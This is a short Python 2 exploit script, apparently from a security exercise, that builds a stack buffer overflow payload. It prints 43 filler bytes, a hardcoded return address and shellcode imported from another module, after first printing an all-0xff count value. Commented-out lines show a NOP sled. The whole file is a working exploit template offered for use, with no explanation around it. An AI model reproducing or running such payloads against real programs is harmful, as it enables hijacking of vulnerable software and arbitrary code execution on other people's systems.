from shellcode import shellcode
from struct import pack
count = "\xff\xff\xff\xff"
print count
#pack("<I", count)
#for x in range(30):
#	print "\x90",
print "\x41" * 43 + pack("<I", 0xbffebea0) + shellcode
#print shellcode
"""
for x in xrange(count * 2):
	print pack("<I",x)
"""